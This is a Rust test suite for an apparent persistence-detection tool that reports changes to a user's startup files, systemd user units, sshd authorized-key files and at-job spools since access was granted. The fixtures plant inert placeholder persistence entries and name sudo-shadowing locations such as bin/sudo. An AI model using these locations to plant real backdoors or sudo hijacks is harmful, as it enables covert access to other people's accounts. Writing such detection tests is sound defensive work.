/// J343: outside links, broken links and cycles cannot support a clean result.
#[test]
fn unresolved_watched_links_make_the_scan_incomplete() {
    for place in [".local/bin", ".bashrc"] {
        for target in ["/var/tmp/j347-never-read", "missing", ".bashrc"] {
            let granted = Granted::new(
                |home| {
                    std::fs::create_dir_all(home.join(place).parent().unwrap()).unwrap();
                    std::os::unix::fs::symlink(target, home.join(place)).unwrap();
                },
                &no_extra,
            );
            let report = granted.report(&no_extra);
            assert_eq!(
                report.accounts[0].reason,
                Some(Reason::Incomplete),
                "{place} -> {target}: {report:?}"
            );
        }
    }
}

/// Resolving only one link hop must not miss a changed startup file.
#[test]
fn a_chain_of_file_links_reaches_its_content() {
    let granted = Granted::new(
        |home| {
            std::fs::write(home.join("real"), "old\n").unwrap();
            std::os::unix::fs::symlink("real", home.join("middle")).unwrap();
            std::os::unix::fs::symlink("middle", home.join(".bashrc")).unwrap();
        },
        &no_extra,
    );
    std::fs::write(granted.home.join("real"), "plant\n").unwrap();
    assert_eq!(granted.report(&no_extra).state, State::Changed);
}

/// An equally unreadable spool at both times is incomplete, never clean.
#[test]
fn unreadable_places_cannot_compare_clean() {
    let extra = |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
        visit(
            "crontab".into(),
            Err(io::ErrorKind::PermissionDenied.into()),
        );
    };
    let granted = Granted::new(|_| {}, &extra);
    let report = granted.report(&extra);
    assert_eq!(
        report.accounts[0].reason,
        Some(Reason::Incomplete),
        "{report:?}"
    );
}

/// A non-directory in a watched path cannot compare as a clean read error.
#[test]
fn unreadable_home_places_are_incomplete() {
    let granted = Granted::new(
        |home| {
            std::fs::write(home.join(".ssh"), "not a directory\n").unwrap();
        },
        &no_extra,
    );
    let report = granted.report(&no_extra);
    assert_eq!(
        report.accounts[0].reason,
        Some(Reason::Incomplete),
        "{report:?}"
    );
}

/// Systemd reads linked drop-in directories as well as linked unit roots.
#[test]
fn a_linked_drop_in_directory_exposes_its_plant() {
    let granted = Granted::new(
        |home| {
            std::fs::create_dir_all(home.join(".config/systemd/user")).unwrap();
            std::fs::create_dir_all(home.join(".dotfiles/dropin")).unwrap();
            std::os::unix::fs::symlink(
                home.join(".dotfiles/dropin"),
                home.join(".config/systemd/user/back.service.d"),
            )
            .unwrap();
        },
        &no_extra,
    );
    std::fs::write(
        granted.home.join(".dotfiles/dropin/back.conf"),
        "ExecStartPost=/tmp/plant\n",
    )
    .unwrap();
    assert_eq!(granted.report(&no_extra).state, State::Changed);
}

/// Each newly watched home place must report a plant, not merely raise a count.
#[test]
fn newly_watched_home_places_detect_plants() {
    for path in [
        "bin/sudo",
        ".config/systemd/user.conf",
        ".config/fish/functions/sudo.fish",
        ".zlogout",
        ".bashrc.d/back.sh",
    ] {
        let granted = Granted::new(|_| {}, &no_extra);
        let plant = granted.home.join(path);
        std::fs::create_dir_all(plant.parent().unwrap()).unwrap();
        std::fs::write(&plant, "j347-plant\n").unwrap();
        let report = granted.report(&no_extra);
        assert!(
            report.accounts[0]
                .files
                .iter()
                .any(|f| f.path == format!("~/{path}") && f.lines == ["j347-plant"]),
            "{path}: {report:?}"
        );
    }
}

/// Effective sshd key files inside the home are scanned with the same safe walker.
#[test]
fn effective_sshd_key_files_are_watched() {
    let extra = |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
        visit("sshd effective configuration".into(), Ok(b"authorizedkeysfile .ssh/custom-%u %%keys\nauthorizedkeyscommand none\nauthorizedprincipalsfile none\nauthorizedprincipalscommand none\n".to_vec()));
    };
    let granted = Granted::new(|_| {}, &extra);
    std::fs::create_dir_all(granted.home.join(".ssh")).unwrap();
    let path = format!(".ssh/custom-{}", granted.user.name);
    std::fs::write(granted.home.join(&path), "ssh-ed25519 AAAAj347 plant\n").unwrap();
    let report = granted.report(&extra);
    assert!(
        report.accounts[0]
            .files
            .iter()
            .any(|f| f.path == format!("~/{path}") && f.lines == ["ssh-ed25519 AAAAj347 plant"]),
        "{report:?}"
    );
}

/// Unsupported or unreadable key sources cannot justify a clean report.
#[test]
fn unknown_sshd_key_sources_are_not_checked() {
    for config in [
        "authorizedkeysfile /etc/ssh/keys/%u\n",
        "authorizedkeysfile .ssh/authorized_keys\nauthorizedkeyscommand /usr/bin/keys\n",
        "authorizedkeysfile .ssh/authorized_keys\nauthorizedprincipalsfile .ssh/principals\n",
        "authorizedkeysfile .ssh/authorized_keys\nauthorizedprincipalscommand /usr/bin/principals\n",
        "authorizedkeysfile .ssh/%x\n",
        "unrecognised configuration\n",
    ] {
        let extra = |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
            visit(
                "sshd effective configuration".into(),
                Ok(config.as_bytes().to_vec()),
            );
        };
        let granted = Granted::new(|_| {}, &extra);
        let report = granted.report(&extra);
        assert_eq!(report.state, State::NotChecked, "{config}: {report:?}");
    }
}

/// Each supported atd spool detects an owned job through the watched table.
#[test]
fn both_at_spools_detect_their_plants() {
    let extra = |account: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
        for place in WATCHED.iter().filter(|p| p.watch == Watch::AtSpool) {
            at_spool(
                account,
                &account.dir.join(place.path.trim_start_matches('/')),
                visit,
            );
        }
    };
    for spool in ["var/spool/cron/atjobs", "var/spool/at"] {
        let granted = Granted::new(|_| {}, &extra);
        let directory = granted.home.join(spool);
        std::fs::create_dir_all(&directory).unwrap();
        std::fs::write(
            directory.join("a00001"),
            "#!/bin/sh\ncd /tmp || {\n exit 1\n}\n/tmp/j347-plant\n",
        )
        .unwrap();
        let report = granted.report(&extra);
        assert!(
            report.accounts[0]
                .files
                .iter()
                .any(|f| f.path.ends_with(&format!("{spool}/a00001"))
                    && f.lines.iter().any(|l| l.contains("j347-plant"))),
            "{spool}: {report:?}"
        );
    }
}

/// A missing grant time cannot support the required since-time sentence.
#[test]
fn missing_baseline_time_is_not_checked() {
    let granted = Granted::new(|_| {}, &no_extra);
    let path = record_path(&granted.store, granted.person, granted.user.uid.as_raw());
    let mut record: Record = serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    record.recorded_at = 0;
    write_private(&path, &serde_json::to_vec(&record).unwrap()).unwrap();
    assert_eq!(granted.report(&no_extra).state, State::NotChecked);
    std::fs::write(granted.home.join(".bashrc"), "plant\n").unwrap();
    assert_eq!(granted.report(&no_extra).state, State::NotChecked);
}

/// Accounts beyond the report budget must be counted as not checked.
#[test]
fn account_overflow_is_counted_and_incomplete() {
    let granted = Granted::new(|_| {}, &no_extra);
    forget(&granted.store, granted.person).unwrap();
    let baseline = serde_json::to_vec(&capture(&granted.user, &no_extra)).unwrap();
    for uid in 20000..20067 {
        write_private(&record_path(&granted.store, granted.person, uid), &baseline).unwrap();
    }
    let report = since_grant(
        &granted.store,
        granted.person,
        &[],
        &|_| Some(granted.user.clone()),
        &no_facts,
        &no_extra,
        false,
    );
    assert_eq!(report.state, State::NotChecked, "{report:?}");
    assert_eq!(report.omitted_accounts, 3);
}
